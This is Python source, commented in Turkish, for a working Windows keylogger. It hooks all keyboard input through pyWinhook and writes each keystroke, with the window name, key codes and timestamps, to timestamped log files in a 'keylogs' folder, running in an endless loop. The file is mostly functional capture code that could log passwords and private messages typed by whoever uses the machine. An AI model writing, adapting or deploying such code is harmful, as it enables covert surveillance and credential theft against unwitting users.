######################################################
#     PAKETLERI KONTROL ETME VE ÖNERİDE BULUNMA     ##
######################################################
try:
    import os, pyWinhook as pyHook, pythoncom, sys, logging, atexit
    from datetime import datetime
except ImportError as ext:
    path = pyHook.__file__
    dllpath = os.path.join(path, "..", "..", "pywin32_system32")
    print("\n", ext)
    print(f" DLL dosyaları koypalanmalı!")
    print()
    print(f"     DLL dosyalarının dizini: ")
    print(f"         {dllpath}")
    print()
    print(f"     Kopyalanacağı dizin:")
    print(f"         C:\Windows\System32")
    quit()

#############################################
#               SABİT DEĞERLER              #
#############################################

LVL_DEBUG = 2 # Tuş basımı dahil her bilgiyi gösterir 
LVL_INFO = 1  # Ek bilgileri de gösterir
LVL_NONE = 0  # Çıktı yok

#############################################
#            EVRENSEL DEĞİŞKENLER           #
#############################################

LOG_DIR = "keylogs"
LOG_FILE = datetime.now().strftime('%d-%b-%Y-%H-%M-%S') + ".log"
LOG_LVL = LVL_DEBUG
KEY_LIMIT = 1

#############################################
#                FONKSİYONLAR               #
#############################################

def parseData(event):
    keyData = []
    keyData.append(f"UTC Time:    {datetime.utcnow()}")
    keyData.append(f"Boot Time:   {event.Time}")
    keyData.append(f"MessageName: {event.MessageName}")
    keyData.append(f"Message:     {event.Message}")
    keyData.append(f"Window:      {event.Window}")
    keyData.append(f"WindowName:  {event.WindowName}")
    keyData.append(f"Ascii:       {event.Ascii}")
    keyData.append(f"Key:         {event.Key}")
    keyData.append(f"KeyID:       {event.KeyID}")
    keyData.append(f"ScanCode:    {event.ScanCode}")
    keyData.append(f"Extended:    {event.Extended}")
    keyData.append(f"Injected:    {event.Injected}")
    keyData.append(f"Alt:         {event.Alt}")
    keyData.append(f"Transition:  {event.Transition}")
    keyData.append(f"")

    return keyData

def printKeyData(keyData):
    if LOG_LVL >= LVL_DEBUG:
        print("\n".join(keyData))

def logListLines(list_lines):
    for list_line in list_lines:
        CONTEXT_FILE.write("\n".join(list_line))
        CONTEXT_FILE.flush()

    """ char = chr(event.Ascii)
    logging.log(10, char) """


# Debug ile öğrenebilirsin
def OnKeyboardEvent(event):
    global list_lines
    keyData = parseData(event)
    list_lines.append(keyData)

    printKeyData(keyData)

    if len(list_lines) > KEY_LIMIT:
        logListLines(list_lines)

    return True

def onexit():
    CONTEXT_FILE.close()

#############################################
#           PROGRAMIN ÇALIŞMA YERI          #
############################################# 

CONTEXT_FILE = open(os.path.join(LOG_DIR, LOG_FILE), "a+", encoding="utf-8")
list_lines = []

atexit.register(onexit)

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
while(True):
    pythoncom.PumpWaitingMessages()

# pythoncom.PumpMessages() # Tuşları algılamak için programı döngüye sokar (while gibi kapanmayı engeller) 

#  asenkron bekleme
